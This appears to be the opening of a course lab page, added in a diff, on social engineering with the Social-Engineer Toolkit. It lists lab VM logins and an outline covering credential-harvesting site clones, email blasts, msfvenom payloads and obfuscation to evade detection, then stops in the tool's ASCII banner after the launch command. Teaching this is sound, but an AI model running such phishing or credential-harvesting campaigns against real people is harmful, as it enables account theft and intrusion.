@@ -1,0 +1,1685 @@
+<!-- LAB HEADER / TOC -->
+<p id="#lab8"></p>
+<table border="0" style="border-collapse: collapse; width: 99%; border-style: none; height: 300px;">
+  <tbody>
+    <tr style="height: 102px;">
+      <td colspan="2" style="width: 100%; text-align: center; vertical-align: top;"><img src="https://web.acd.ccac.edu/~mkisow/assets/ccac-logo.png" style="border: 0px solid #000000;" width="311" height="100" alt="ccac-logo"/></td>
+    </tr>
+    <tr style="height: 30px;">
+      <td colspan="2" style="font-family: arial, helvetica, sans-serif; font-size: 24pt; width: 100%; text-align: center; vertical-align: top;"><strong>LAB 8: SOCIAL ENGINEERING</strong></td>
+    </tr>
+    
+    <tr style="height: 22.5px;">
+      <td style="width: 72%; height: 22.50px;"><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt; color: #ba372a;"><strong>INSTRUCTIONS</strong></span></td>
+      <!-- <td rowspan="6" style="width: 28%; height: 175px;  vertical-align: top;">
+        <table border="0" style="border-collapse: collapse; width: 350px; background-color: #ecf0f1; border-style: none; float: right; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+          <tbody>
+            <tr>
+              <td style="width: 100%; height: 20px;"><strong><span style="font-family: arial, helvetica, sans-serif;">Table of Contents:</span></strong></td>
+            </tr>
+            <tr>
+              <td style="width: 100%; height: 20px;"><span style="font-family: arial, helvetica, sans-serif; color: #ba372a;">&nbsp; &nbsp; &raquo; <a href="##sitecloner" style="color: #ba372a;">Part 1 - Credential Harvesting via Site Cloner</a></span></td>
+            </tr>
+            <tr>
+              <td style="width: 100%; height: 20px;"><span style="font-family: arial, helvetica, sans-serif; color: #ba372a;">&nbsp; &nbsp; &raquo; <a href="##eblast" style="color: #ba372a;">Part 2 - Email Blast</a></span></td>
+            </tr>
+            <tr>
+              <td style="width: 100%; height: 20px;"><span style="font-family: arial, helvetica, sans-serif; color: #ba372a;">&nbsp; &nbsp; &raquo; <a href="##payload" style="color: #ba372a;">Part 3 - Payloads via msfvenom</a></span></td>
+            </tr>
+            <tr>
+              <td style="width: 100%; height: 20px;"><span style="font-family: arial, helvetica, sans-serif; color: #ba372a;">&nbsp; &nbsp; &raquo; <a href="##payloadobf" style="color: #ba372a;">Part 4 - Payload Obfuscation</a></span></td>
+            </tr>
+          </tbody>
+        </table>
+      </td> -->
+    </tr>
+    <tr>
+      <td style="width: 72%; vertical-align: top; height: 75px; text-align: justify;"><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">The social engineering lab is an immersive and hands-on exploration of offensive security techniques, employing the powerful tools installed on Kali Linux and the intentionally vulnerable Metasploitable2 Linux server. In this immersive session, participants will delve into social engineering, a crucial aspect of ethical hacking. Armed with tools such as site cloner, email blast, and the prowess of msvenom for crafting payloads, students will orchestrate a comprehensive social engineering campaign. The exploration extends to the strategic use of payload obfuscation techniques, enhancing participants' understanding of the subtleties involved in evading detection. By the conclusion of this lab, students will not only have honed their technical expertise but also developed a nuanced appreciation for the strategic application of social engineering tactics in the ever-evolving landscape of cybersecurity.<br /><br />"<em>The Social-Engineer Toolkit is an open-source penetration testing framework for social engineering. SET has several custom attack vectors that allow you to make a believable attack quickly.</em>" - <a href="https://github.com/trustedsec/social-engineer-toolkit" target="_blank" rel="noopener"><span style="color: #ba372a;">TrustedSec</span></a></span><br /><br /><p style="font-family: arial, helvetica, sans-serif; color: #ba372a; font-size: 12pt; text-align: center; margin: 0; padding: 0;"><strong><em>Upload your answers to this lab.</em></strong></p></td>
+    </tr>
+    <tr>
+      <td style="width: 72%; height: 22.50px; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt; color: #ba372a;"><strong>OBJECTIVE</strong></span></td>
+    </tr>
+    <tr>
+      <td style="width: 72%; vertical-align: top; height: 75px; text-align: justify;"><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">The primary objective of this lab is to empower students with the skills and knowledge required to conduct ethical and responsible penetration testing activities. By utilizing an isolated network virtual machine and Metasploitable2, students will delve into the fascinating realm of network exploration, gaining insights into potential vulnerabilities within the lab environment.</span></td>
+    </tr>
+    <tr>
+      <td style="width: 72%; vertical-align: top; height: 75px; text-align: justify;">
+        <p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Begin by logging into the Academic vSphere Portal using your student credentials. Once logged in, navigate to your assigned Virtual Application (VApp) within the portal. This lab will use the following VM's within your VApp with the following credentials.</span></p>
+        <blockquote>
+          <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;"><strong>Kali Linux</strong></span></p>
+          <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">&emsp;<strong>Username</strong>: labuser</span></p>
+          <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">&emsp;<strong>Password</strong>: P@$$w0rd</span></p>
+        </blockquote>
+        <blockquote>
+          <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;"><strong>Metasploitable2</strong></span></p>
+          <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">&emsp;<strong>Username</strong>: msfadmin</span></p>
+          <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">&emsp;<strong>Password</strong>: msfadmin</span></p>
+        </blockquote>
+      </td>
+    </tr>
+  </tbody>
+</table>
+
+<!-- VERSION/REVISION -->
+<p style="font-family: arial, helvetica, sans-serif; font-size: 12pt; text-align: center; margin: 0; padding: 0; color: #ced4d9">VERSION 2.2</p>
+<p style="font-family: arial, helvetica, sans-serif; font-size: 12pt; text-align: center; margin: 0; padding: 0; color: #ced4d9">REVISED 13-NOV-2024</p>
+
+<!-- PART 1 -->
+<hr />
+<p id="#sitecloner"><span style="font-family: arial, helvetica, sans-serif; font-size: 14pt; color: #ba372a;"><strong>Part 1 - Credential Harvesting via Site Cloner</strong></span></p>
+
+<blockquote>
+  <p style="text-align: justify;">
+    <span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">
+      A fundamental premise underlying many features of the  <a href="https://www.social-engineer.org/framework/se-tools/computer-based/social-engineer-toolkit-set/" target="_blank" rel="noopener"><span style="color: #ba372a;"><strong>Social Engineering Toolkit (SET)</strong></span></a>, is its capacity to swiftly generate attacks tailored for testing and demonstration objectives. However, an essential inquiry pertains to the believability of these generated attacks. It is pertinent to acknowledge that while SET facilitates the rapid creation of attack scenarios, their credibility hinges on various factors.<br /><br />
+      In assessing the credibility of SET-generated attacks, one must recognize the distinction between their immediate utility for demonstration purposes and their efficacy in real-world scenarios. While SET offers convenience in rapidly crafting attack simulations, achieving a level of authenticity that mirrors genuine cyber threats demands additional considerations beyond the tool's functionalities.<br /><br />
+      Notably, the transition from a novice, or "script kiddie," level of proficiency to orchestrating attacks with a tangible likelihood of success necessitates a deeper understanding of the targeted systems, human psychology, and evolving cybersecurity defenses. SET, by design, serves as an entry point for exploring social engineering tactics; however, advancing beyond this initial stage mandates supplementary efforts.<br /><br />
+      To attain a level of proficiency wherein cyberattacks pose a genuine threat, practitioners must complement their toolkit with a broader arsenal of techniques and tools. This progression typically involves leveraging other specialized software and, in many cases, developing custom tools tailored to specific objectives and targeted environments. Such bespoke solutions afford practitioners the flexibility to adapt their methodologies to circumvent evolving defense mechanisms and enhance the sophistication of their attacks.<br /><br />
+      Consequently, while SET offers a valuable starting point for familiarizing oneself with social engineering techniques, its utility in orchestrating attacks with a substantial probability of success is contingent upon the practitioner's ability to integrate complementary tools and cultivate a nuanced understanding of cybersecurity principles. Thus, while SET expedites the creation of attack scenarios for demonstration purposes, achieving credibility in practical settings necessitates a multifaceted approach encompassing diverse tools and skill sets beyond the purview of SET alone.<br /><br />
+    </span>
+  </p>
+</blockquote>
+
+<!-- 1.1 -->
+<ol style="font-family: arial, helvetica, sans-serif; font-size: 12pt;" start="1">
+  <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Let's begin our lab by starting the Social-Engineer Toolkit.</span></p>
+
+    <!-- CODE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr style="background-color: #ced4e9;">
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"></span><strong>CODE</strong></td>
+        </tr>
+        <tr>
+          <td colspan="4" style="width: 99%;">
+            <p style="margin: 0; padding: 0;">
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Run the Social-Engineer Toolkit<br /></span></strong>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ sudo <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">setoolkit</span> </span></strong>
+            </p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+
+    <!-- CODE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr style="background-color: #ced4e9;">
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"></span><strong>CODE</strong></td>
+        </tr>
+        <tr>
+          <td colspan="4" style="width: 99%;">
+            <p style="margin: 0; padding: 0;">
+              <strong>
+                <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">
+                XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX<br />
+                XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX<br />
+                XX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;MMMMMMMMMMMMMMMMMMMMMssssssssssssssssssssssssssMMMMMMMMMMMMMMMMMMMMM&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;MMMMMMMMMMMMMMMMss'''&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'''ssMMMMMMMMMMMMMMMM&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;MMMMMMMMMMMMyy''&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;''yyMMMMMMMMMMMM&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;MMMMMMMMyy''&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;''yyMMMMMMMM&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;MMMMMy''&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;''yMMMMM&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;MMMy'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'yMMM&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;Mh'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'hM&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;::&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;::&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;MMhh.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;..hhhhhh..&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;..hhhhhh..&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.hhMM&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;MMMMMh&nbsp;&nbsp;&nbsp;..hhMMMMMMMMMMhh.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.hhMMMMMMMMMMhh..&nbsp;&nbsp;&nbsp;hMMMMM&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;---MMM&nbsp;.hMMMMdd:::dMMMMMMMhh..&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;..hhMMMMMMMd:::ddMMMMh.&nbsp;MMM---&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;MMMMMM&nbsp;MMmm''&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'mmMMMMMMMMyy.&nbsp;&nbsp;.yyMMMMMMMMmm'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;''mmMM&nbsp;MMMMMM&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;---mMM&nbsp;''&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'mmMMMMMMMM&nbsp;&nbsp;MMMMMMMMmm'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;''&nbsp;MMm---&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;yyyym'&nbsp;&nbsp;&nbsp;&nbsp;.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'mMMMMm'&nbsp;&nbsp;'mMMMMm'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.&nbsp;&nbsp;&nbsp;&nbsp;'myyyy&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;mm''&nbsp;&nbsp;&nbsp;&nbsp;.y'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;..yyyyy..&nbsp;&nbsp;''''&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;''''&nbsp;&nbsp;..yyyyy..&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'y.&nbsp;&nbsp;&nbsp;&nbsp;''mm&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MN&nbsp;&nbsp;&nbsp;&nbsp;.sMMMMMMMMMss.&nbsp;&nbsp;&nbsp;.&nbsp;&nbsp;&nbsp;&nbsp;.&nbsp;&nbsp;&nbsp;.ssMMMMMMMMMs.&nbsp;&nbsp;&nbsp;&nbsp;NM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;N`&nbsp;&nbsp;&nbsp;&nbsp;MMMMMMMMMMMMMN&nbsp;&nbsp;&nbsp;M&nbsp;&nbsp;&nbsp;&nbsp;M&nbsp;&nbsp;&nbsp;NMMMMMMMMMMMMM&nbsp;&nbsp;&nbsp;&nbsp;`N&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+&nbsp;&nbsp;.sMNNNNNMMMMMN+&nbsp;&nbsp;&nbsp;`N&nbsp;&nbsp;&nbsp;&nbsp;N`&nbsp;&nbsp;&nbsp;+NMMMMMNNNNNMs.&nbsp;&nbsp;+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o+++&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;++++Mo&nbsp;&nbsp;&nbsp;&nbsp;M&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;M&nbsp;&nbsp;&nbsp;&nbsp;oM++++&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+++o&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;oo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;oo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;oM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;oo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;oo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;oMMo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;M&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;M&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;oMMo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+MMMM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MMMM+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+MMMMM+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+++NNNN+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+NNNN+++&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+MMMMM+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+MMMMMMM+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;++NNMMMMMMMMN+&nbsp;&nbsp;&nbsp;&nbsp;+NMMMMMMMMNN++&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+MMMMMMM+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MMMMMMMMMNN+++NNMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMNN+++NNMMMMMMMMM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XX<br />
+                XX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XX<br />
